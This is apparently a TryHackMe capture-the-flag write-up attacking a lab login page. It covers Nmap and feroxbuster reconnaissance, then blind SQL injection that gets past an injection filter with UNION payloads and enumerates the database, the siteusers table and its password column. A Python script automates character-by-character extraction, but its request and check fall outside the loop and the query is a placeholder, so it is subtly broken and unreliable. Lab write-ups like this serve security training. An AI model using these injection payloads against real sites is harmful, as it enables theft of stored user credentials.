![](https://tryhackme-images.s3.amazonaws.com/room-icons/4fda99da293ec0bc477a4b9e456e55e1.png)

---
# Nmap Scan:

```Bash
$ scan 10.10.165.50
--------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0c569e6dd6b810cda32be41e35b9787 (RSA)
|   256 6c65ad87087a3e4c7dea3a30764d0416 (ECDSA)
|_  256 2d571d56f6565229eaaada33b2772c9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
--------------------------------------------------------------------
```

---
# Port 80:

```bash
$ feroxbuster -u http://10.10.165.50 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
--------------------------------------------------------------------
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       36l       76w     1081c http://10.10.165.50/index.php
200      GET       42l      104w     1567c http://10.10.165.50/register.php
200      GET       36l       76w     1081c http://10.10.165.50/
302      GET        0l        0w        0c http://10.10.165.50/welcome.php => index.php
302      GET        0l        0w        0c http://10.10.165.50/logout.php => index.php
200      GET        1l        0w        1c http://10.10.165.50/config.php
--------------------------------------------------------------------
```

index.php: Simple Login Page
config.php: nothing interesting

---

# SQL injection

On the login page the username parameter seems to be vulnerable to SQL injection.

After injecting the following payload: 

```mysql
' OR 1=1;-- -
```

the page gives us this error: SQL Injection detected. This incident will be logged!

After playing around a bit i found a working payload.

```mysql
' UNION SELECT 0,0,0,0;-- -
```

Now we can craft a payload based on this to get the database name.

```sql
' UNION SELECT 0,0,0,0 WHERE Database() like BINARY '%';-- -
```

If we do this manually its going to be a pain in the ass. That's why I wrote a script in python to automate the process

```python
import requests
import string

## Defining Characters
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "-_+\{\}[]()/*.,"
url = "http://10.10.88.131/index.php"

result = ''

while True:
	## Loop through each character
	for char in chars:
		query = <PAYLOAD>
		data = {
		'username': query,
		'password': 'blabla'
		}
		
	r = requests.post(url, data=data, allow_redirects=True)
	if "Invalid username or password" in r.text:
		continue
	else:
		result += char
		print(result)
		break
```

To get the Table name and columns we need to change the payload based on the results we get.

- Database: mywebsite  
   
```sql
' UNION SELECT 0,0,0,0 WHERE Database() LIKE '%';-- -
```

- Table: siteusers
   
```sql
' UNION SELECT 0,0,0,0 FROM information_schema.tables WHERE table_schema = 'mywebsite' AND table_name LIKE '%';-- -
```

- Column: password, 

```sql
' UNION SELECT 0,0,0,0 FROM information_schema.columns WHERE table_schema = 'mywebsite' AND table_name = 'siteusers' AND column_name LIKE '%';-- -
```
